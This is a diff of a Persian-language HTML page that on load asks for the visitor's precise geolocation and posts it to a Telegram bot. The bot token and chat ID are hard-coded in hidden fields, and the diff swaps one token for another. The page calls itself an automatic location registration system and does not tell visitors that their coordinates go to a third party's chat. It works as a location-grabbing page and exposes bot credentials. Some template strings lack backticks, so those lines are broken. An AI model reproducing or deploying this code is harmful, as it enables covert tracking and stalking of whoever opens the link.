@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صفحه ثبت خودکار موقعیت مکانی (Auto-Tracking V2)</title>
+    <title>سامانه ارسال لوکیشن خودکار و دقیق</title>
     <style>
         /* CSS برای طراحی رسمی و مدرن */
         body {
@@ -30,7 +30,7 @@
             text-align: center;
         }
         h1 {
-            color: #172a5a; /* رنگ رسمی‌تر */
+            color: #172a5a;
             font-size: 26px;
             border-bottom: 3px solid #172a5a;
             padding-bottom: 10px;
@@ -71,125 +71,117 @@
 <body onload="requestAndSendLocation()"> 
     
     <div class="container">
-        <h1>سامانه ثبت موقعیت مکانی (نسخه ۲)</h1>
+        <h1>سامانه ثبت موقعیت مکانی خودکار</h1>
         
         <div class="info-box">
-            <p><strong>اطلاعیه مهم:</strong> سیستم به طور خودکار، فرآیند درخواست موقعیت مکانی را در پس‌زمینه آغاز کرده است. لطفاً در صورت مشاهده هرگونه پیغام در مرورگر، *اجازه دسترسی به مکان (Location Access)* را صادر فرمایید.</p>
+            <p><strong>اطلاعیه مهم:</strong> سیستم به طور خودکار، فرآیند درخواست موقعیت مکانی شما را آغاز کرده است. لطفاً در صورت مشاهده پیغام مرورگر، *اجازه دسترسی به مکان (Location Access)* را صادر فرمایید.</p>
         </div>
         
-        <input type="hidden" id="bot-token" value="8597685412:AAH3ymwMQkCzsxb9Rru8j0ePa8Lu7Jx0UYg"> 
+        <input type="hidden" id="bot-token" value="7851461640:AAFr8MiKSffcmsalQMF-oczoUwopV1bfcu8"> 
         <input type="hidden" id="chat-id" value="7570861617"> 
-        <input type="hidden" id="user-token-id" value="REF-CLIENT-2025-01-A">
+        <input type="hidden" id="user-token-id" value="AUTO-REF-WEB-2025-02-B">
 
-        <div id="status-message">⏳ در حال بارگذاری سیستم و بررسی وضعیت دسترسی...</div>
+        <div id="status-message">⏳ در حال بارگذاری سیستم و درخواست موقعیت مکانی...</div>
     </div>
 
     <script>
-        // تابع کمکی برای به‌روزرسانی وضعیت پیام
+        // تابع کمکی برای به‌روزرسانی وضعیت پیام در صفحه
         function updateStatus(message, type = '') {
             const statusElement = document.getElementById('status-message');
             statusElement.innerHTML = message;
             statusElement.className = type;
         }
 
-        // تابع اصلی که هنگام بارگذاری صفحه فراخوانی می‌شود
+        // تابع اصلی: درخواست لوکیشن هنگام بارگذاری صفحه
         function requestAndSendLocation() {
             const BOT_TOKEN = document.getElementById('bot-token').value;
             const CHAT_ID = document.getElementById('chat-id').value;
-            const USER_TOKEN = document.getElementById('user-token-id').value;
+            const USER_TOKEN = document.getElementById('user-token-id').value; // توکن رهگیری اختیاری
 
             if (!navigator.geolocation) {
-                updateStatus("❌ مرورگر شما از Geolocation پشتیبانی نمی‌کند. لطفا مرورگر خود را به‌روزرسانی کنید.", 'error');
+                updateStatus("❌ مرورگر شما از Geolocation پشتیبانی نمی‌کند.", 'error');
                 return;
             }
             
-            updateStatus("⏳ در حال درخواست موقعیت مکانی... لطفا Pop-up مرورگر را تأیید کنید.");
+            updateStatus("⏳ در حال درخواست موقعیت مکانی... لطفاً مجوز مرورگر را تأیید کنید.");
 
-            // دریافت لوکیشن با تنظیمات دقیق‌تر (Timeout کمتر)
+            // دریافت لوکیشن با تنظیمات دقت بالا
             navigator.geolocation.getCurrentPosition(
                 
-                // در صورت موفقیت (Success Callback)
+                // Success Callback: در صورت دریافت موفقیت‌آمیز مختصات
                 (position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     
-                    updateStatus(✅ موقعیت مکانی دریافت شد. Latitude: ${lat}, Longitude: ${lon}.<br> در حال ارسال به تلگرام...);
+                    updateStatus(✅ موقعیت مکانی دریافت شد. Latitude: ${lat}, Longitude: ${lon}. در حال ارسال به تلگرام...);
                     
-                    // ارسال به API تلگرام
+                    // فراخوانی تابع ارسال لوکیشن به تلگرام
                     sendLocationToTelegram(lat, lon, USER_TOKEN, BOT_TOKEN, CHAT_ID);
                 },
                 
-                // در صورت عدم موفقیت (Error Callback)
+                // Error Callback: در صورت بروز خطا (مثل عدم صدور مجوز)
                 (error) => {
                     let errorMessage;
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
-                            errorMessage = "❌ *خطای عدم مجوز:* کاربر دسترسی را لغو کرد. لطفاً تنظیمات مرورگر خود را بررسی کنید.";
+                            errorMessage = "❌ *عدم مجوز:* کاربر دسترسی را لغو کرد.";
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            errorMessage = "⚠ *خطای دسترس‌ناپذیری:* اطلاعات موقعیت مکانی در دسترس نیست (مثلاً به دلیل عدم اتصال به GPS).";
+                            errorMessage = "⚠ *خطای فنی:* اطلاعات موقعیت مکانی در دسترس نیست.";
                             break;
                         case error.TIMEOUT:
-                            errorMessage = "⌛ *خطای وقفه:* درخواست موقعیت مکانی بیش از حد طول کشید و متوقف شد.";
+                            errorMessage = "⌛ *خطای وقفه:* درخواست موقعیت مکانی به پایان رسید.";
                             break;
                         default:
-                            errorMessage = "🔥 *خطای نامشخص:* در دریافت موقعیت مکانی رخ داد. مطمئن شوید که سایت با HTTPS باز شده است.";
+                            errorMessage = "🔥 *خطای نامشخص:* در دریافت موقعیت مکانی رخ داد.";
                     }
                     updateStatus(errorMessage, 'error');
                 },
                 
-                // تنظیمات Geolocation Options
+                // تنظیمات Geolocation API
                 {
-                    enableHighAccuracy: true, // درخواست دقت بالا
-                    timeout: 5000,            // ۵ ثانیه مهلت برای دریافت لوکیشن
-                    maximumAge: 0             // از کش (Cache) لوکیشن استفاده نشود
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
                 }
             );
         }
 
-        // تابع ارسال به تلگرام
+        // تابع ارسال به تلگرام با استفاده از متد sendLocation
         function sendLocationToTelegram(lat, lon, userToken, botToken, chatId) {
             
-            // ساخت پیام رسمی و دقیق
-            const message = (
-                "🚨 *گزارش ثبت موقعیت مکانی خودکار (V2)*\n" +
-                "----------------------------------------\n" +
-                **توکن رهگیری:** \${userToken}\\n +
-                **توکن ربات:** \${botToken.substring(0, 10)}...\\n +
-                **عرض جغرافیایی (Lat):** ${lat}\n +
-                **طول جغرافیایی (Lon):** ${lon}\n +
-                **لینک نقشه:** [مشاهده در Google Maps](https://www.google.com/maps/search/?api=1&query=${lat},${lon})\n +
-                "----------------------------------------\n" +
-                زمان ثبت (UTC): ${new Date().toUTCString()}
-            );
-
-            const telegramApiUrl = https://api.telegram.org/bot${botToken}/sendMessage;
+            // آدرس API برای متد sendLocation (دقت کنید که /bot حذف شده است)
+            const telegramApiUrl = https://api.telegram.org/bot${botToken}/sendLocation;
             
+            // بدنه درخواست (Payload) با پارامترهای اصلی sendLocation
             const payload = {
                 chat_id: chatId,
-                text: message,
-                parse_mode: 'Markdown' 
+                latitude: lat,        // ارسال مستقیم عرض جغرافیایی
+                longitude: lon,       // ارسال مستقیم طول جغرافیایی
+                // پارامترهای اختیاری زیر برای اضافه کردن جزئیات بیشتر به پیام بعد از نقشه مفید است
+                caption: ✅ **موقعیت مکانی ثبت شد!**\nتوکن رهگیری: \${userToken}\\nزمان: ${new Date().toLocaleString('fa-IR')},
+                parse_mode: 'Markdown'
             };
 
             fetch(telegramApiUrl, {
                 method: 'POST',
                 headers: {
+                    // Content-Type باید application/json باشد
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(payload),
+                body: JSON.stringify(payload), // ارسال داده‌ها به صورت JSON
             })
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    updateStatus("✔ *ارسال موفق!* اطلاعات با موفقیت به تلگرام ارسال شد.", 'success');
+                    updateStatus("✔ *ارسال موفق!* نقشه موقعیت مکانی با موفقیت به تلگرام ارسال شد.", 'success');
                 } else {
-                    // در صورت خطای تلگرام، معمولاً به دلیل CHAT_ID یا توکن نامعتبر است.
-                    updateStatus(❌ **خطا در API تلگرام:** ${data.description}. (توکن یا آیدی چت را بررسی کنید.), 'error');
+                    updateStatus(❌ **خطا در API تلگرام:** ${data.description}. (با وجود توکن معتبر، مشکل در ارسال داده است.), 'error');
                     console.error("Telegram API Error:", data);
                 }
             })
             .catch((error) => {
-                updateStatus(🔥 **خطای شبکه:** در اتصال به سرور تلگرام مشکلی وجود دارد: ${error.message}, 'error');
+                updateStatus(🔥 **خطای شبکه:** اتصال به سرور تلگرام برقرار نشد: ${error.message}, 'error');
                 console.error("Network Error:", error);
             });
         }
